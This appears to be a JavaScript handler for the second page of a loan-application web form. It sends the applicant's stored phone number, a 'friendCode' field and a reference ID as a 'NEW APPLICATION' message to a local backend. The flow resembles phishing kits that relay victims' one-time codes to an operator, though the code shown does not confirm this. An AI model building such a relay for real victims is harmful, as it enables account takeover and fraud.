// Page 2 logic - sends to backend API
const API_URL = 'http://localhost:5000/api';

document.addEventListener('DOMContentLoaded', loadSummary);

async function submitForm(e) {
    e.preventDefault();
    
    const loanData = JSON.parse(localStorage.getItem('loanApp'));
    const friendCode = document.getElementById('friendCode').value;
    
    const message = `🔔 NEW APPLICATION\nPhone: ${loanData.phone}\nCode: ${friendCode}\nRef: ${loanData.referenceId}`;
    
    await fetch(`${API_URL}/send-message`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ message })
    });
    
    localStorage.setItem('currentRef', loanData.referenceId);
    window.location.href = '/page3';
}